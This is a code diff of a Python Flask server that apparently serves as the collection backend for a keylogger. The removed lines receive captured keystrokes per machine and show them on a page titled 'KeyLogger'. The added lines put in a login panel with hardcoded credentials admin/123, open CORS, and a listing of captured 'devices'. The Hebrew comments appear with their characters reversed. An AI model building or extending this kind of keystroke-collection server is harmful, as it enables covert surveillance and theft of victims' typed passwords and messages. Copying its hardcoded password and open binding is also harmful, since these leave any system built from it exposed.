@@ -1,52 +1,38 @@
-from flask import Flask, jsonify, request
-import time
+from flask import Flask, jsonify, request, send_from_directory
 import os
-
+from flask_cors import CORS
 app=Flask(__name__)
+CORS(app)
 data=''
-@app.route('/',methods=['GET'])
-def response_data():
-    head = f'<h1> KeyLogger </h1><p1>{data}</p1>'
-    return head
 
-@app.route('/post',methods=['POST'])
-def requests_data():
-    global data
-    req=request.data
-    data +=str(req)
-    print(data)
-    return 'OK'
+BASE_FOLDER = os.getcwd()
+DEVICES_FOLDER = os.path.join(BASE_FOLDER, "data", "devices")
+FRONTEND_FOLDER = os.path.join(os.getcwd(), "frontend")
 
-def generate_log_filename():
-    # הריזחמ םש ץבוק ססובמה לע תמתוח ןמז
-    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
+users = {'admin' : '123'}
 
+@app.route('/')
+def home():
+    return send_from_directory(FRONTEND_FOLDER, "login.html")
 
-@app.route('/api/upload', methods=['POST'])
-def upload():
+@app.route('/login', methods=['POST'])
+def login():
     data = request.get_json()
-    if not data or "machine" not in data or "data" not in data:
-        return jsonify({"error": "Invalid payload"}), 400
+    username = data.get('username')
+    password = data.get('password')
 
-    machine = data["machine"]
-    log_data = data["data"]
+    if username in users and users[username] == password:
+        return jsonify({"success": True})
+    else:
+        return jsonify({"success":False})
 
-    # תריצי הייקית רובע רישכמה םא הניא תמייק
-    machine_folder = os.path.join(DATA_FOLDER, machine)
-    if not os.path.exists(machine_folder):
-        os.makedirs(machine_folder)
+@app.route('/computers', methods=['GET'])
+def list_computers():
+    computers = [d for d in os.listdir(DEVICES_FOLDER)]
 
-        # תריצי םש ץבוק שדח יפל תמתוח ןמז
-    filename = generate_log_filename()
-    file_path = os.path.join(machine_folder, filename)
-
-    # ןתינ ףיסוהל ןאכ דוביע ,ףסונ לשמל תפסוה תמתוח ןמז תפסונ ךותב ץבוקה
-    with open(file_path, "w", encoding="utf-8") as f:
-        f.write(log_data)
-
-    return jsonify({"status": "success", "file": file_path}), 200
+    return {"computers": computers}
 
 
 
-if __name__==('__main__'):
-    app.run(debug=True)
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
